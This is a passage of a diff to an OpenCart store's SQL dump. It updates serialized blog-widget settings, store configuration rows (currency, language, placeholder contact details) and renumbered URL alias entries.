5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:9:"blogs.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"1";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"0";s:15:"category_button";s:1:"1";s:5:"blogs";a:1:{i:0;s:1:"8";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:7;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:14:"Новости";i:3;s:14:"Новости";i:4;s:14:"Новости";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:8:"news.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:5:"blogs";a:1:{i:0;s:1:"9";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:8;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:14:"Проекты";i:3;s:14:"Проекты";i:4;s:14:"Проекты";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:12:"projects.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:5:"blogs";a:1:{i:0;s:2:"10";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:9;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:12:"Услуги";i:3;s:8:"Services";i:4;s:14:"Послуги";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:12:"services.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:5:"blogs";a:1:{i:0;s:1:"6";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}}', 1),
 (1035, 0, 'filter', 'filter_status', '1', 0),
 (1055, 0, 'prodline', 'prodline_status', '1', 0),
 (1056, 0, 'prodline', 'prodline', 'a:2:{i:0;a:3:{s:5:"title";a:3:{i:1;s:27:"Первая линейка";i:3;s:27:"Первая линейка";i:4;s:27:"Первая линейка";}s:4:"desc";a:3:{i:1;s:59:"&lt;p&gt;Просто первая линейка&lt;/p&gt;";i:3;s:136:"&lt;p&gt;&lt;span style=&quot;line-height: 17.1429px;&quot;&gt;Просто первая линейка&lt;/span&gt;&lt;br&gt;&lt;/p&gt;";i:4;s:136:"&lt;p&gt;&lt;span style=&quot;line-height: 17.1429px;&quot;&gt;Просто первая линейка&lt;/span&gt;&lt;br&gt;&lt;/p&gt;";}s:10:"sort_order";s:1:"0";}i:1;a:3:{s:5:"title";a:3:{i:1;s:27:"Вторая линейка";i:3;s:27:"Вторая линейка";i:4;s:27:"Вторая линейка";}s:4:"desc";a:3:{i:1;s:56:"&lt;p&gt;Вторая линейка&lt;br&gt;&lt;/p&gt;";i:3;s:56:"&lt;p&gt;Вторая линейка&lt;br&gt;&lt;/p&gt;";i:4;s:56:"&lt;p&gt;Вторая линейка&lt;br&gt;&lt;/p&gt;";}s:10:"sort_order";s:1:"1";}}', 1),
 (1284, 0, 'blog_module', 'blog_module', 'a:7:{i:1;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:1:{i:0;s:1:"1";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"3";s:10:"sort_order";s:0:"";}i:2;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:17:{i:0;s:1:"6";i:1;s:2:"10";i:2;s:2:"15";i:3;s:1:"3";i:4;s:1:"7";i:5;s:2:"12";i:6;s:1:"4";i:7;s:1:"1";i:8;s:2:"11";i:9;s:1:"5";i:10;s:1:"2";i:11;s:2:"16";i:12;s:2:"13";i:13;s:1:"9";i:14;s:1:"8";i:15;s:2:"17";i:16;s:2:"14";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"4";s:10:"sort_order";s:0:"";}i:3;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:17:{i:0;s:1:"6";i:1;s:2:"10";i:2;s:2:"15";i:3;s:1:"3";i:4;s:1:"7";i:5;s:2:"12";i:6;s:1:"4";i:7;s:1:"1";i:8;s:2:"11";i:9;s:1:"5";i:10;s:1:"2";i:11;s:2:"16";i:12;s:2:"13";i:13;s:1:"9";i:14;s:1:"8";i:15;s:2:"17";i:16;s:2:"14";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"5";s:10:"sort_order";s:0:"";}i:4;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:1:{i:0;s:2:"20";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"6";s:10:"sort_order";s:0:"";}i:5;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:1:{i:0;s:2:"21";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"7";s:10:"sort_order";s:0:"";}i:6;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:1:{i:0;s:2:"22";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"8";s:10:"sort_order";s:0:"";}i:0;a:7:{s:12:"url_template";s:1:"0";s:3:"url";s:0:"";s:9:"layout_id";a:1:{i:0;s:2:"23";}s:8:"position";s:14:"content_bottom";s:6:"status";s:1:"1";s:4:"what";s:1:"9";s:10:"sort_order";s:0:"";}}', 1),
-(1283, 0, 'ascp_widgets', 'ascp_widgets', 'a:7:{i:3;a:45:{s:6:"remove";s:0:"";s:4:"type";s:7:"records";s:17:"title_list_latest";a:3:{i:1;s:14:"Главная";i:3;s:14:"Главная";i:4;s:14:"Главная";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:12:"adaptive.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:7:"related";a:2:{i:0;s:1:"3";i:1;s:1:"2";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:4;a:20:{s:6:"remove";s:0:"";s:4:"type";s:5:"blogs";s:17:"title_list_latest";a:3:{i:1;s:16:"Компания";i:3;s:16:"Компания";i:4;s:16:"Компания";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:12:"thumb_status";s:1:"0";s:8:"template";s:13:"blog_menu.tpl";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:6:"cached";s:1:"1";s:8:"counting";s:1:"1";s:5:"blogs";a:1:{i:0;s:1:"4";}s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:5;a:20:{s:6:"remove";s:0:"";s:4:"type";s:5:"blogs";s:17:"title_list_latest";a:3:{i:1;s:16:"Контакты";i:3;s:16:"Контакты";i:4;s:16:"Контакты";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:12:"thumb_status";s:1:"0";s:8:"template";s:13:"blog_menu.tpl";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:6:"cached";s:1:"1";s:8:"counting";s:1:"1";s:5:"blogs";a:1:{i:0;s:1:"5";}s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:6;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:10:"Блоги";i:3;s:10:"Блоги";i:4;s:10:"Блоги";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:9:"blogs.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"1";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"0";s:15:"category_button";s:1:"1";s:5:"blogs";a:1:{i:0;s:1:"8";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:7;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:14:"Новости";i:3;s:14:"Новости";i:4;s:14:"Новости";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:8:"news.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:5:"blogs";a:1:{i:0;s:1:"9";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:8;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:14:"Проекты";i:3;s:14:"Проекты";i:4;s:14:"Проекты";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:12:"projects.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:5:"blogs";a:1:{i:0;s:2:"10";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}i:9;a:45:{s:6:"remove";s:0:"";s:4:"type";s:6:"latest";s:17:"title_list_latest";a:3:{i:1;s:12:"Услуги";i:3;s:8:"Services";i:4;s:14:"Послуги";}s:6:"avatar";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:6:"images";a:2:{s:5:"width";s:0:"";s:6:"height";s:0:"";}s:19:"blog_small_colorbox";s:1:"0";s:11:"images_view";s:1:"1";s:8:"template";s:12:"services.tpl";s:6:"cached";s:1:"1";s:12:"modal_status";s:1:"0";s:14:"template_modal";s:0:"";s:19:"block_records_width";s:0:"";s:6:"anchor";s:0:"";s:16:"anchor_templates";s:0:"";s:17:"number_per_widget";s:0:"";s:10:"pagination";s:1:"0";s:5:"limit";s:1:"0";s:4:"sort";s:1:"0";s:12:"desc_symbols";s:0:"";s:10:"desc_words";s:0:"";s:9:"desc_pred";s:0:"";s:5:"order";s:4:"sort";s:8:"order_ad";s:4:"desc";s:13:"author_status";s:1:"0";s:13:"avatar_status";s:1:"1";s:12:"title_status";s:1:"1";s:18:"description_status";s:1:"1";s:15:"category_status";s:1:"0";s:9:"view_date";s:1:"1";s:10:"view_share";s:1:"0";s:13:"view_comments";s:1:"1";s:11:"view_viewed";s:1:"0";s:11:"view_rating";s:1:"1";s:15:"category_button";s:1:"0";s:5:"blogs";a:1:{i:0;s:1:"6";}s:7:"further";a:3:{i:1;s:0:"";i:3;s:0:"";i:4;s:0:"";}s:9:"box_begin";s:0:"";s:19:"box_begin_templates";s:0:"";s:7:"box_end";s:0:"";s:17:"box_end_templates";s:0:"";s:5:"store";a:1:{i:0;s:1:"0";}s:15:"customer_groups";a:4:{i:0;s:1:"1";i:1;s:2:"-1";i:2;s:2:"-2";i:3;s:2:"-3";}s:9:"doc_ready";s:1:"1";s:4:"ajax";s:1:"0";s:8:"reserved";s:0:"";}}', 1);
+(1556, 0, 'config', 'config_voucher_min', '1', 0),
+(1552, 0, 'config', 'config_limit_admin', '20', 0),
+(1551, 0, 'config', 'config_product_description_length', '100', 0),
+(1550, 0, 'config', 'config_product_limit', '15', 0),
+(1549, 0, 'config', 'config_product_count', '1', 0),
+(1548, 0, 'config', 'config_weight_class_id', '1', 0),
+(1547, 0, 'config', 'config_length_class_id', '1', 0),
+(1546, 0, 'config', 'config_currency_auto', '1', 0),
+(1545, 0, 'config', 'config_currency', 'UAH', 0),
+(1543, 0, 'config', 'config_language', 'ru', 0),
+(1544, 0, 'config', 'config_admin_language', 'ru', 0),
+(1542, 0, 'config', 'config_zone_id', '139', 0),
+(1541, 0, 'config', 'config_country_id', '220', 0),
+(1540, 0, 'config', 'config_layout_id', '4', 0),
+(1539, 0, 'config', 'config_template', 'service', 0),
+(1538, 0, 'config', 'config_meta_keyword', '', 0),
+(1537, 0, 'config', 'config_meta_description', 'Мой магазин', 0),
+(1535, 0, 'config', 'config_comment', '', 0),
+(1536, 0, 'config', 'config_meta_title', 'Интернет магазин Opencart &quot;Русская сборка&quot;', 0),
+(1533, 0, 'config', 'config_image', '', 0),
+(1534, 0, 'config', 'config_open', '', 0),
+(1531, 0, 'config', 'config_telephone', '495 999-99-99', 0),
+(1532, 0, 'config', 'config_fax', '495 888-88-88', 0),
+(1530, 0, 'config', 'config_email', 'dimonich41@gmail.com', 0),
+(1529, 0, 'config', 'config_geocode', '', 0),
+(1528, 0, 'config', 'config_address', 'г. Москва, ул. Ленина 10 оф. 32', 0),
+(1527, 0, 'config', 'config_owner', 'Иванов Иван', 0),
+(1526, 0, 'config', 'config_name', 'Интернет магазин Opencart &quot;Русская сборка&quot;', 0),
+(1640, 0, 'config', 'config_google_captcha_secret', '', 0),
+(1641, 0, 'config', 'config_google_captcha_status', '0', 0);
 
 -- --------------------------------------------------------
 
@@ -3898,24 +3922,24 @@ CREATE TABLE IF NOT EXISTS `oc_url_alias` (
   PRIMARY KEY (`url_alias_id`),
   KEY `query` (`query`),
   KEY `keyword` (`keyword`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1017 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1030 ;
 
 --
 -- Дамп данных таблицы `oc_url_alias`
 --
 
 INSERT INTO `oc_url_alias` (`url_alias_id`, `query`, `keyword`) VALUES
-(824, 'product_id=48', 'ipod-classic'),
+(1029, 'product_id=48', 'ipod-classic'),
 (730, 'manufacturer_id=8', 'apple'),
 (772, 'information_id=4', 'about_us'),
 (991, 'product_id=42', 'test'),
 (930, 'category_id=66', 'komplektujuschie'),
 (915, 'category_id=67', 'produktsija'),
 (970, 'information_id=7', 'foto'),
-(924, 'category_id=72', 'dizel-generatory'),
-(919, 'category_id=69', 'dizelnye-dvigateli'),
+(1025, 'category_id=72', 'dizel-generatory'),
+(1026, 'category_id=69', 'dizelnye-dvigateli'),
 (1002, 'product_id=30', 'canon-eos-5d'),
-(1013, 'product_id=47', 'hp-lp3065'),
+(1023, 'product_id=47', 'hp-lp3065'),
 (890, 'product_id=28', 'htc-touch-hd'),
 (1015, 'product_id=43', 'macbook'),
 (813, 'product_id=44', 'macbook-air'),
@@ -3927,7 +3951,7 @@ INSERT INTO `oc_url_alias` (`url_alias_id`, `query`, `keyword`) VALUES
 (820, 'product_id=33', 'samsung-syncmaster-941bw'),
 (821, 'product_id=46', 'sony-vaio'),
 (837, 'product_id=41', 'imac'),
-(1014, 'product_id=40', 'iphone'),
+(1024, 'product_id=40', 'iphone'),
 (825, 'product_id=36', 'ipod-nano'),
 (826, 'product_id=34', 'ipod-shuffle'),
 (827, 'product_id=32', 'ipod-touch'),
@@ -3973,8 +3997,8 @@ INSERT INTO `oc_url_alias` (`url_alias_id`, `query`, `keyword`) VALUES
 (884, 'affiliate/tracking', 'affiliate-tracking'),
 (885, 'affiliate/transaction', 'affiliate-transaction'),
 (886, 'affiliate/account', 'affiliates'),
-(969, 'category_id=70', 'sinxronnye-generatory'),
-(923, 'category_id=71', 'prochie-komplektujuschie');
+(1028, 'category_id=70', 'sinxronnye-generatory'),
+(1027, 'category_id=71', 'prochie-komplektujuschie');
 
 -- --------------------------------------------------------
 
@@ -3988,7 +4012,7 @@ CREATE TABLE IF NOT EXISTS `oc_url_alias_blog` (
   `keyword` varchar(255) NOT NULL,
   `language_id` int(11) NOT NULL DEFAULT '1',
   PRIMARY KEY (`url_alias_id`)
-) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=158 ;
+) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=179 ;
 
 --
 -- Дамп данных таблицы `oc_url_alias_blog`
@@ -3997,9 +4021,9 @@ CREATE TABLE IF NOT EXISTS `oc_url_alias_blog` (
 INSERT INTO `oc_url_alias_blog` (`url_alias_id`, `query`, `keyword`, `language_id`) VALUES
 (67, 'record_id=1', 'pervaja-zapis', 4),
 (66, 'record_id=1', 'razdel-o-dizelnyh-generatorah', 3),
-(103, 'record_id=2', 'razdel-o-konversionnyh-elektrostantsijah', 4),
-(102, 'record_id=2', 'razdel-o-konversionnyh-elektrostantsijah', 3),
-(101, 'record_id=2', 'razdel-o-konversionnyh-elektrostantsijah', 1),
+(178, 'record_id=2', 'razdel-o-konversionnyh-elektrostantsijah', 4),
+(177, 'record_id=2', 'razdel-o-konversionnyh-elektrostantsijah', 3),
+(176, 'record_id=2', 'razdel-o-konversionnyh-elektrostantsijah', 1),
 (18, 'blog_id=1', 'test-kateg', 3),
 (17, 'blog_id=1', 'test-kateg', 1),
 (19, 'blog_id=1', 'test-kateg', 4),
@@ -4016,18 +4040,18 @@ INSERT INTO `oc_url_alias_blog` (`url_alias_id`, `query`, `keyword`, `language_i
 (138, 'record_id=6', 'novaja-usluga', 3),
 (137, 'record_id=6', 'novaja-usluga', 1),
 (65, 'record_id=1', 'pervaja-zapis', 1),
-(106, 'record_id=3', 'razdel-o-sistemah-upravlenija-dgu', 4),
-(105, 'record_id=3', 'razdel-o-sistemah-upravlenija-dgu', 3),
-(104, 'record_id=3', 'razdel-o-sistemah-upravlenija-dgu', 1),
+(175, 'record_id=3', 'razdel-o-sistemah-upravlenija-dgu', 4),
+(174, 'record_id=3', 'razdel-o-sistemah-upravlenija-dgu', 3),
+(173, 'record_id=3', 'razdel-o-sistemah-upravlenija-dgu', 1),
 (92, 'record_id=7', 'zakazat-obratnyj-zvonok', 1),
 (93, 'record_id=7', 'zakazat-obratnyj-zvonok', 3),
 (94, 'record_id=7', 'zakazat-obratnyj-zvonok', 4),
 (133, 'blog_id=8', 'blogi', 4),
 (132, 'blog_id=8', 'blogi', 3),
 (131, 'blog_id=8', 'blogi', 1),
-(124, 'record_id=8', 'blog1', 4),
-(123, 'record_id=8', 'blog1', 3),
-(122, 'record_id=8', 'blog1', 1),
+(169, 'record_id=8', 'blog1', 4),
+(168, 'record_id=8', 'blog1', 3),
+(167, 'record_id=8', 'blog1', 1),
 (130, 'record_id=9', 'blog2', 4),
 (129, 'record_id=9', 'blog2', 3),
 (128, 'record_id=9', 'blog2', 1),
@@ -4043,9 +4067,9 @@ INSERT INTO `oc_url_alias_blog` (`url_alias_id`, `query`, `keyword`, `language_i
 (152, 'blog_id=10', 'proekty', 1),
 (153, 'blog_id=10', 'proekty', 3),
 (154, 'blog_id=10', 'proekty', 4),
